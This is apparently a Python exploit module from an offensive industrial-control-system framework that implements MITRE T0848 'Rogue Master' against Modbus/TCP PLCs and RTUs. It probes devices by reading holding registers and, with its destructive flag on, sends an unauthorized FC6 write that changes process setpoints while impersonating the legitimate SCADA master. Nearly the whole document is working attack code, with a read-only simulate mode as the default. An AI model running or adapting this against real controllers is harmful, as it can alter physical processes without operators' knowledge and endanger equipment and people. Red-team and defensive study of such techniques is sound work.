"""MITRE T0848 - Rogue Master: Modbus Master Impersonation.

Adversaries may set up a rogue Modbus master to intercept or inject commands
into the Modbus network. This module demonstrates the TTP by sending
unauthorized Modbus commands as if coming from a legitimate master.

MITRE ATT&CK for ICS v19: T0848 (Rogue Master)
Tactics: Impair Process Control
"""

import socket
import struct
import time

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":         "MITRE T0848 Rogue Master - Unauthorized Modbus Commands",
        "description":  "Impersonates a legitimate Modbus master by sending unauthorized "
                        "FC3/FC6 commands to a Modbus slave (PLC/RTU). Demonstrates the "
                        "T0848 (Rogue Master) TTP: reading process state and optionally "
                        "writing unauthorized setpoint changes. "
                        "Simulate mode only reads - never writes.",
        "authors":      ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":   (
            "https://attack.mitre.org/techniques/T0848/",
        ),
        "devices":      ("Any Modbus/TCP PLC", "RTU", "Gateway"),
        "impact":       "HIGH",
        "exploit_type": "Rogue Master / Unauthorized Command",
        "source_poc":   "IXF native (Python raw socket)",
        "cve":          "N/A", "cvss": "N/A", "severity": "HIGH",
        "mitre_techniques": ["T0848", "T1692.001", "T0836", "T0831"],
        "mitre_tactics":    ["Impair Process Control"],
        "destructive_description": (
            "Will send unauthorized Modbus FC6 (Write Single Register) commands to "
            "{target}:{port} as a rogue master, impersonating the legitimate SCADA master. "
            "Process setpoints may be modified without legitimate operator knowledge."
        ),
    }

    target          = OptIP("", "Target Modbus slave IP")
    port            = OptPort(502, "Modbus TCP port")
    unit_id         = OptInteger(1, "Modbus unit ID")
    write_address   = OptInteger(0, "Register address to write (destructive mode)")
    write_value     = OptInteger(0, "Value to write (destructive mode)")
    timeout         = OptInteger(5, "Socket timeout")
    simulate        = OptBool(True, "Simulate mode (default: True - read-only)")
    destructive     = OptBool(False, "Enable rogue write (HIGH impact)")

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x03, 0, 10)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(pdu)
            resp = sock.recv(64)
            sock.close()
            return len(resp) >= 8 and resp[7] == 0x03
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option first.")
            return

        if self.simulate:
            print_status("[T0848 Rogue Master] Performing READ-ONLY probe (simulate=True)…")
            # Safe: read holding registers (non-destructive)
            try:
                pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x03, 0, 10)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))
                sock.send(pdu)
                resp = sock.recv(128)
                sock.close()

                if len(resp) >= 9 and resp[7] == 0x03:
                    byte_count = resp[8]
                    data = resp[9:9+byte_count]
                    print_success(f"[T0848] Rogue master read {byte_count // 2} registers from {self.target}:{self.port}.")
                    values = [struct.unpack(">H", data[i:i+2])[0] for i in range(0, len(data), 2)]
                    print_info(f"[T0848] Register values (addr 0-9): {values[:10]}")
                    print_warning("[T0848] T0848 confirmed: rogue master can read process state.")
                    DestructiveGate.print_simulation(
                        description=(
                            "In destructive mode: rogue master would send FC6 Write to "
                            f"register {self.write_address} value {self.write_value} - modifying process setpoint "
                            "without legitimate operator action."
                        ),
                        payload_hex=f"00 01 00 00 00 06 {self.unit_id:02X} 06 {self.write_address:04X} {self.write_value:04X}",
                        mitre_techniques=["T0848", "T1692.001"],
                    )
                else:
                    print_info("[T0848] No valid Modbus response.")
            except Exception as exc:
                print_error(f"[T0848] Error: {exc}")
            return

        # Destructive: send unauthorized write
        print_status(f"[T0848 LIVE] Sending unauthorized FC6 write to {self.target}:{self.port}…")
        try:
            pdu = struct.pack(
                ">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x06,
                self.write_address, self.write_value
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(pdu)
            resp = sock.recv(32)
            sock.close()
            if len(resp) >= 8 and resp[7] == 0x06:
                print_success(f"[T0848] Rogue write accepted - register {self.write_address} set to {self.write_value}.")
            else:
                print_error(f"[T0848] Write response unexpected: {resp.hex()}")
        except Exception as exc:
            print_error(f"[T0848] Error: {exc}")
